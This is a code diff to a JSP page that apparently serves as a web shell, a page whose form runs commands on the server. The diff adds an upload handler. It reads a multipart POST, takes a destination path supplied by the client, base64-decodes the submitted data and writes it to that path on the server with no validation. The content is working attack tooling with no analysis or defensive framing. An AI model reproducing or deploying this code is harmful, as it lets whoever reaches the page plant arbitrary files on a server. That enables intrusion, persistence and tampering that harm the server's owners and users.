@@ -97,9 +97,10 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 </form>
 
 <hr />
-<pre>
 <%
 	if("POST".equals(request.getMethod())) {
+		out.println("<pre>");
+		
 		String requestContent = "";
 		
 		final BufferedReader requestReader = new BufferedReader(new InputStreamReader(request.getInputStream()));
@@ -122,11 +123,32 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 		final String filepath = requestContent.substring(startPosition, endPosition);
 		
 		out.println("Writing to destination:  " + filepath);
-		
 		out.println();
 		
-		out.println("|||" + requestContent + "|||");
-
+		// Ignore the data:MIME/TYPE;base64, part
+		startPosition = requestContent.indexOf(boundary + "\r\n" + "Content-Disposition: form-data; name=\"base64filecontent\"");
+		startPosition = requestContent.indexOf("base64,", startPosition);
+		startPosition += "base64,".length();
+		
+		endPosition = requestContent.indexOf(boundary, startPosition);
+		endPosition -= "\r\n".length();
+		
+		final String base64content = requestContent.substring(startPosition, endPosition);
+		// If you get stuck with Java 7 or before change to javax.xml.bind.DatatypeConverter.parseBase64Binary
+		//	or sun.misc.BASE64Decoder().decode()
+		final byte[] filebytes = java.util.Base64.getDecoder().decode(base64content);
+		
+		out.println("Writing " + filebytes.length + " bytes");
+		out.println();
+		
+		final OutputStream os = new FileOutputStream(new File(filepath));
+		os.write(filebytes);
+		os.close();
+		
+		//out.println("DEBUG");
+		//out.println("|||" + requestContent + "|||");
+		
+		out.println("</pre>");
 	}
 %>
 
@@ -161,8 +183,8 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 <hr />
 
 <h3>Server Information</h3>
-<pre>
 
+<pre>
 Server localtime:	<%= Calendar.getInstance().getTime() %>
 Server localtime in milliseconds:	<%= Calendar.getInstance().getTimeInMillis() %>
 (Epoch is January 1, 1970 00:00:00.000 GMT)
